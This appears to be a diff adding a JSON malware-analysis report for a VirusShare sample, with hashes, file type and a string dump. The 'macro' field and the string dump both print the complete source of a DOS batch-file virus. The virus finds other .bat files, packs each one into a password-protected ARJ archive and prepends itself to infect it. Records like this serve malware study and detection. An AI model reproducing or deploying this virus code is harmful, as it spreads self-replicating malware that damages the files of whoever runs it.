@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "if \"%1\"==\"2\" goto s\nfor %%b in (*.bat) do call %0 2 %%b\ngoto b\n:s\nif %2==I.BAT goto b\ncopy %2 s>l\necho NNN>>s\necho 1>z1\necho 2>z2\necho 3>z3\ndel z?/p<s>l\nif exist z? goto i\ndel ??\ngoto b\n:i\nren %2 p >l\narj a j p i.bat BATalia3 -g\ufffd\ufffdb\ufffdp\ufffd >nul\ncopy /b BATalia3+j.arj %2>l\ndel j.arj\ndel ??\n:b"
+    },
+    "filename": "VirusShare_35790528e6e967a5e0fc5951d70285b1",
+    "filesize": 309,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "35790528e6e967a5e0fc5951d70285b1",
+        "sha1": "077c6d4e06816b8dd1d007042ed907794221dfc8",
+        "sha256": "96975dbb02aa76e35f2a941f7b7c2ebb69ba402ba49f11a9b5b14382d616bf21"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "if \"%1\"==\"2\" goto s",
+            "for %%b in (*.bat) do call %0 2 %%b",
+            "goto b",
+            "if %2==I.BAT goto b",
+            "copy %2 s>l",
+            "echo NNN>>s",
+            "echo 1>z1",
+            "echo 2>z2",
+            "echo 3>z3",
+            "del z?/p<s>l",
+            "if exist z? goto i",
+            "del ??",
+            "goto b",
+            "ren %2 p >l",
+            "arj a j p i.bat BATalia3 -gbp >nul",
+            "copy /b BATalia3+j.arj %2>l",
+            "del j.arj",
+            "del ??"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262126",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
